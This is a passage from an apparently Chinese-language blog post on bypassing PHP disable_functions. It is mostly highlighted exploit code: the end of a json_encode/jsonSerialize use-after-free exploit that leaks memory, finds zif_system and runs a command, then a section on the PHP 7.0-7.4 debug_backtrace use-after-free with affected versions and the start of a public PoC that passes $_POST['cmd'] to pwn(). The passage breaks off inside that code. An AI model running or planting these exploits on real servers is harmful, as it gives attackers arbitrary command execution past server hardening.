language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">leak2</span>(<span class="hljs-variable">$base</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">2</span>);<br>        <span class="hljs-variable">$e_phnum</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">leak2</span>(<span class="hljs-variable">$base</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">2</span>);<br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$e_phnum</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$header</span> = <span class="hljs-variable">$base</span> + <span class="hljs-variable">$e_phoff</span> + <span class="hljs-variable">$i</span> * <span class="hljs-variable">$e_phentsize</span>;<br>            <span class="hljs-variable">$p_type</span>  = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">leak2</span>(<span class="hljs-variable">$header</span>, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>);<br>            <span class="hljs-variable">$p_flags</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">leak2</span>(<span class="hljs-variable">$header</span>, <span class="hljs-number">4</span>, <span class="hljs-number">4</span>);<br>            <span class="hljs-variable">$p_vaddr</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">leak2</span>(<span class="hljs-variable">$header</span>, <span class="hljs-number">0x10</span>);<br>            <span class="hljs-variable">$p_memsz</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">leak2</span>(<span class="hljs-variable">$header</span>, <span class="hljs-number">0x28</span>);<br><br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$p_type</span> == <span class="hljs-number">1</span> &amp;&amp; <span class="hljs-variable">$p_flags</span> == <span class="hljs-number">6</span>) &#123; <span class="hljs-comment"># PT_LOAD, PF_Read_Write</span><br>                <span class="hljs-comment"># handle pie</span><br>                <span class="hljs-variable">$data_addr</span> = <span class="hljs-variable">$e_type</span> == <span class="hljs-number">2</span> ? <span class="hljs-variable">$p_vaddr</span> : <span class="hljs-variable">$base</span> + <span class="hljs-variable">$p_vaddr</span>;<br>                <span class="hljs-variable">$data_size</span> = <span class="hljs-variable">$p_memsz</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$p_type</span> == <span class="hljs-number">1</span> &amp;&amp; <span class="hljs-variable">$p_flags</span> == <span class="hljs-number">5</span>) &#123; <span class="hljs-comment"># PT_LOAD, PF_Read_exec</span><br>                <span class="hljs-variable">$text_size</span> = <span class="hljs-variable">$p_memsz</span>;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$data_addr</span> || !<span class="hljs-variable">$text_size</span> || !<span class="hljs-variable">$data_size</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br><br>        <span class="hljs-keyword">return</span> [<span class="hljs-variable">$data_addr</span>, <span class="hljs-variable">$text_size</span>, <span class="hljs-variable">$data_size</span>];<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_basic_funcs</span>(<span class="hljs-params"><span class="hljs-variable">$base</span>, <span class="hljs-variable">$elf</span></span>) </span>&#123;<br>        <span class="hljs-keyword">list</span>(<span class="hljs-variable">$data_addr</span>, <span class="hljs-variable">$text_size</span>, <span class="hljs-variable">$data_size</span>) = <span class="hljs-variable">$elf</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$data_size</span> / <span class="hljs-number">8</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$leak</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">leak2</span>(<span class="hljs-variable">$data_addr</span>, <span class="hljs-variable">$i</span> * <span class="hljs-number">8</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$leak</span> - <span class="hljs-variable">$base</span> &gt; <span class="hljs-number">0</span> &amp;&amp; <span class="hljs-variable">$leak</span> - <span class="hljs-variable">$base</span> &lt; <span class="hljs-variable">$data_addr</span> - <span class="hljs-variable">$base</span>) &#123;<br>                <span class="hljs-variable">$deref</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">leak2</span>(<span class="hljs-variable">$leak</span>);<br>                <span class="hljs-comment"># &#x27;constant&#x27; constant check</span><br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$deref</span> != <span class="hljs-number">0x746e6174736e6f63</span>)<br>                    <span class="hljs-keyword">continue</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">continue</span>;<br><br>            <span class="hljs-variable">$leak</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">leak2</span>(<span class="hljs-variable">$data_addr</span>, (<span class="hljs-variable">$i</span> + <span class="hljs-number">4</span>) * <span class="hljs-number">8</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$leak</span> - <span class="hljs-variable">$base</span> &gt; <span class="hljs-number">0</span> &amp;&amp; <span class="hljs-variable">$leak</span> - <span class="hljs-variable">$base</span> &lt; <span class="hljs-variable">$data_addr</span> - <span class="hljs-variable">$base</span>) &#123;<br>                <span class="hljs-variable">$deref</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">leak2</span>(<span class="hljs-variable">$leak</span>);<br>                <span class="hljs-comment"># &#x27;bin2hex&#x27; constant check</span><br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$deref</span> != <span class="hljs-number">0x786568326e6962</span>)<br>                    <span class="hljs-keyword">continue</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">continue</span>;<br><br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$data_addr</span> + <span class="hljs-variable">$i</span> * <span class="hljs-number">8</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_binary_base</span>(<span class="hljs-params"><span class="hljs-variable">$binary_leak</span></span>) </span>&#123;<br>        <span class="hljs-variable">$base</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-variable">$start</span> = <span class="hljs-variable">$binary_leak</span> &amp; <span class="hljs-number">0xfffffffffffff000</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">0x1000</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$addr</span> = <span class="hljs-variable">$start</span> - <span class="hljs-number">0x1000</span> * <span class="hljs-variable">$i</span>;<br>            <span class="hljs-variable">$leak</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">leak2</span>(<span class="hljs-variable">$addr</span>, <span class="hljs-number">0</span>, <span class="hljs-number">7</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$leak</span> == <span class="hljs-number">0x10102464c457f</span>) &#123; <span class="hljs-comment"># ELF header</span><br>                <span class="hljs-keyword">return</span> <span class="hljs-variable">$addr</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_system</span>(<span class="hljs-params"><span class="hljs-variable">$basic_funcs</span></span>) </span>&#123;<br>        <span class="hljs-variable">$addr</span> = <span class="hljs-variable">$basic_funcs</span>;<br>        <span class="hljs-keyword">do</span> &#123;<br>            <span class="hljs-variable">$f_entry</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">leak2</span>(<span class="hljs-variable">$addr</span>);<br>            <span class="hljs-variable">$f_name</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">leak2</span>(<span class="hljs-variable">$f_entry</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>);<br><br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$f_name</span> == <span class="hljs-number">0x6d6574737973</span>) &#123; <span class="hljs-comment"># system</span><br>                <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">leak2</span>(<span class="hljs-variable">$addr</span> + <span class="hljs-number">8</span>);<br>            &#125;<br>            <span class="hljs-variable">$addr</span> += <span class="hljs-number">0x20</span>;<br>        &#125; <span class="hljs-keyword">while</span>(<span class="hljs-variable">$f_entry</span> != <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">jsonSerialize</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$y</span>, <span class="hljs-variable">$cmd</span>, <span class="hljs-variable">$spl1</span>, <span class="hljs-variable">$fake_tbl_off</span>, <span class="hljs-variable">$n_alloc</span>;<br><br>        <span class="hljs-variable">$contiguous</span> = [];<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$n_alloc</span>; <span class="hljs-variable">$i</span>++)<br>            <span class="hljs-variable">$contiguous</span>[] = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DateInterval</span>(<span class="hljs-string">&#x27;PT1S&#x27;</span>);<br><br>        <span class="hljs-variable">$room</span> = [];<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$n_alloc</span>; <span class="hljs-variable">$i</span>++)<br>            <span class="hljs-variable">$room</span>[] = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">Z</span>();<br><br>        <span class="hljs-variable">$_protector</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">ptr2str</span>(<span class="hljs-number">0</span>, <span class="hljs-number">78</span>);<br><br>        <span class="hljs-variable language_">$this</span>-&gt;abc = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">ptr2str</span>(<span class="hljs-number">0</span>, <span class="hljs-number">79</span>);<br>        <span class="hljs-variable">$p</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DateInterval</span>(<span class="hljs-string">&#x27;PT1S&#x27;</span>);<br><br>        <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$y</span>[<span class="hljs-number">0</span>]);<br>        <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$p</span>);<br><br>        <span class="hljs-variable">$protector</span> = <span class="hljs-string">&quot;.<span class="hljs-subst">$_protector</span>&quot;</span>;<br><br>        <span class="hljs-variable">$x</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DateInterval</span>(<span class="hljs-string">&#x27;PT1S&#x27;</span>);<br>        <span class="hljs-variable">$x</span>-&gt;d = <span class="hljs-number">0x2000</span>;<br>        <span class="hljs-variable">$x</span>-&gt;h = <span class="hljs-number">0xdeadbeef</span>;<br>        <span class="hljs-comment"># $this-&gt;abc is now of size 0x2000</span><br><br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">str2ptr</span>(<span class="hljs-variable">$this</span>-&gt;abc) != <span class="hljs-number">0xdeadbeef</span>) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;UAF failed.&#x27;</span>);<br>        &#125;<br><br>        <span class="hljs-variable">$spl1</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MySplFixedArray</span>();<br>        <span class="hljs-variable">$spl2</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MySplFixedArray</span>();<br><br>        <span class="hljs-comment"># some leaks</span><br>        <span class="hljs-variable">$class_entry</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">str2ptr</span>(<span class="hljs-variable">$this</span>-&gt;abc, <span class="hljs-number">0x120</span>);<br>        <span class="hljs-variable">$handlers</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">str2ptr</span>(<span class="hljs-variable">$this</span>-&gt;abc, <span class="hljs-number">0x128</span>);<br>        <span class="hljs-variable">$php_heap</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">str2ptr</span>(<span class="hljs-variable">$this</span>-&gt;abc, <span class="hljs-number">0x1a8</span>);<br>        <span class="hljs-variable">$abc_addr</span> = <span class="hljs-variable">$php_heap</span> - <span class="hljs-number">0x218</span>;<br><br>        <span class="hljs-comment"># create a fake class_entry</span><br>        <span class="hljs-variable">$fake_obj</span> = <span class="hljs-variable">$abc_addr</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$this</span>-&gt;abc, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>); <span class="hljs-comment"># type</span><br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$this</span>-&gt;abc, <span class="hljs-number">0x120</span>, <span class="hljs-variable">$abc_addr</span>); <span class="hljs-comment"># fake class_entry</span><br><br>        <span class="hljs-comment"># copy some of class_entry definition</span><br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">16</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$this</span>-&gt;abc, <span class="hljs-number">0x10</span> + <span class="hljs-variable">$i</span> * <span class="hljs-number">8</span>, <br>                <span class="hljs-variable">$this</span>-&gt;<span class="hljs-title function_ invoke__">leak1</span>(<span class="hljs-variable">$class_entry</span> + <span class="hljs-number">0x10</span> + <span class="hljs-variable">$i</span> * <span class="hljs-number">8</span>));<br>        &#125;<br><br>        <span class="hljs-comment"># fake static members table</span><br>        <span class="hljs-variable">$fake_tbl_off</span> = <span class="hljs-number">0x70</span> * <span class="hljs-number">4</span> - <span class="hljs-number">16</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$this</span>-&gt;abc, <span class="hljs-number">0x30</span>, <span class="hljs-variable">$abc_addr</span> + <span class="hljs-variable">$fake_tbl_off</span>);<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$this</span>-&gt;abc, <span class="hljs-number">0x38</span>, <span class="hljs-variable">$abc_addr</span> + <span class="hljs-variable">$fake_tbl_off</span>);<br><br>        <span class="hljs-comment"># fake zval_reference</span><br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$this</span>-&gt;abc, <span class="hljs-variable">$fake_tbl_off</span>, <span class="hljs-variable">$abc_addr</span> + <span class="hljs-variable">$fake_tbl_off</span> + <span class="hljs-number">0x10</span>); <span class="hljs-comment"># zval</span><br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$this</span>-&gt;abc, <span class="hljs-variable">$fake_tbl_off</span> + <span class="hljs-number">8</span>, <span class="hljs-number">10</span>); <span class="hljs-comment"># zval type (reference)</span><br><br>        <span class="hljs-comment"># look for binary base</span><br>        <span class="hljs-variable">$binary_leak</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">leak2</span>(<span class="hljs-variable">$handlers</span> + <span class="hljs-number">0x10</span>);<br>        <span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$base</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get_binary_base</span>(<span class="hljs-variable">$binary_leak</span>))) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-comment"># parse elf header</span><br>        <span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$elf</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">parse_elf</span>(<span class="hljs-variable">$base</span>))) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t parse ELF&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-comment"># get basic_functions address</span><br>        <span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$basic_funcs</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get_basic_funcs</span>(<span class="hljs-variable">$base</span>, <span class="hljs-variable">$elf</span>))) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-comment"># find system entry</span><br>        <span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$zif_system</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get_system</span>(<span class="hljs-variable">$basic_funcs</span>))) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);<br>        &#125;<br>        <br>        <span class="hljs-comment"># copy hashtable offsetGet bucket</span><br>        <span class="hljs-variable">$fake_bkt_off</span> = <span class="hljs-number">0x70</span> * <span class="hljs-number">5</span> - <span class="hljs-number">16</span>;<br><br>        <span class="hljs-variable">$function_data</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">str2ptr</span>(<span class="hljs-variable">$this</span>-&gt;abc, <span class="hljs-number">0x50</span>);<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">4</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$this</span>-&gt;abc, <span class="hljs-variable">$fake_bkt_off</span> + <span class="hljs-variable">$i</span> * <span class="hljs-number">8</span>, <br>                <span class="hljs-variable">$this</span>-&gt;<span class="hljs-title function_ invoke__">leak2</span>(<span class="hljs-variable">$function_data</span> + <span class="hljs-number">0x40</span> * <span class="hljs-number">4</span>, <span class="hljs-variable">$i</span> * <span class="hljs-number">8</span>));<br>        &#125;<br><br>        <span class="hljs-comment"># create a fake bucket</span><br>        <span class="hljs-variable">$fake_bkt_addr</span> = <span class="hljs-variable">$abc_addr</span> + <span class="hljs-variable">$fake_bkt_off</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$this</span>-&gt;abc, <span class="hljs-number">0x50</span>, <span class="hljs-variable">$fake_bkt_addr</span>);<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">3</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$this</span>-&gt;abc, <span class="hljs-number">0x58</span> + <span class="hljs-variable">$i</span> * <span class="hljs-number">4</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>);<br>        &#125;<br><br>        <span class="hljs-comment"># copy bucket zval</span><br>        <span class="hljs-variable">$function_zval</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">str2ptr</span>(<span class="hljs-variable">$this</span>-&gt;abc, <span class="hljs-variable">$fake_bkt_off</span>);<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">12</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$this</span>-&gt;abc,  <span class="hljs-variable">$fake_bkt_off</span> + <span class="hljs-number">0x70</span> + <span class="hljs-variable">$i</span> * <span class="hljs-number">8</span>, <br>                <span class="hljs-variable">$this</span>-&gt;<span class="hljs-title function_ invoke__">leak2</span>(<span class="hljs-variable">$function_zval</span>, <span class="hljs-variable">$i</span> * <span class="hljs-number">8</span>));<br>        &#125;<br><br>        <span class="hljs-comment"># pwn</span><br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$this</span>-&gt;abc, <span class="hljs-variable">$fake_bkt_off</span> + <span class="hljs-number">0x70</span> + <span class="hljs-number">0x30</span>, <span class="hljs-variable">$zif_system</span>);<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$this</span>-&gt;abc, <span class="hljs-variable">$fake_bkt_off</span>, <span class="hljs-variable">$fake_bkt_addr</span> + <span class="hljs-number">0x70</span>);<br><br>        <span class="hljs-variable">$spl1</span>-&gt;<span class="hljs-title function_ invoke__">offsetGet</span>(<span class="hljs-variable">$cmd</span>);<br><br>        <span class="hljs-keyword">exit</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$y</span> = [<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">Z</span>()];<br><span class="hljs-title function_ invoke__">json_encode</span>([&amp;<span class="hljs-variable">$y</span>]);<br></code></pre></td></tr></table></figure><h2 id="php7-Backtrace-UAF（PHP-7-0-7-4）"><a href="#php7-Backtrace-UAF（PHP-7-0-7-4）" class="headerlink" title="php7_Backtrace_UAF（PHP 7.0-7.4）"></a>php7_Backtrace_UAF（PHP 7.0-7.4）</h2><p><strong>利用条件</strong></p><ul><li>Linux 操作系统</li><li>PHP7.0 - all versions to date</li><li>PHP7.1 - all versions to date</li><li>PHP7.2 - all versions to date</li><li>PHP7.3 &lt; 7.3.15 (released 20 Feb 2020)</li><li>PHP7.4 &lt; 7.4.3 (released 20 Feb 2020)</li></ul><p><strong>原理</strong></p><p>该漏洞利用在 debug_backtrace() 函数中使用了两年的一个 bug。我们可以诱使它返回对已被破坏的变量的引用，从而导致释放后使用漏洞</p><p><a href="https://bugs.php.net/bug.php?id=76047">Use-after-free when accessing already destructed backtrace arguments</a></p><p><strong>exp</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment"># PHP 7.0-7.4 disable_functions bypass PoC (*nix only)</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Bug: https://bugs.php.net/bug.php?id=76047</span><br><span class="hljs-comment"># debug_backtrace() returns a reference to a variable</span><br><span class="hljs-comment"># that has been destroyed, causing a UAF vulnerability.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># This exploit should work on all PHP 7.0-7.4 versions</span><br><span class="hljs-comment"># released as of 30/01/2020.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Author: https://github.com/mm0r1</span><br><br><span class="hljs-comment">//pwn(&quot;uname -a&quot;);</span><br><span class="hljs-title function_ invoke__">pwn</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">pwn</span>(<span class="hljs-params"><span class="hljs-variable">$cmd</span></span>) </span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$abc</span>, <span class="hljs-variable">$helper</span>, <span class="hljs-variable">$backtrace</span>;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Vuln</span> </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123; <br>            <span class="hljs-keyword">global</span> <span class="hljs-variable">$backtrace</span>; <br>            <span class="hljs-keyword">unset</span>(<span class="hljs-variable language_">$this</span>-&gt;a);<br>            <span class="hljs-variable">$backtrace</span> = (<span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>)-&gt;<span class="hljs-title function_ invoke__">getTrace</span>(); <span class="hljs-comment"># ;)</span><br>            <span class="hljs-keyword">if</span>(!<span 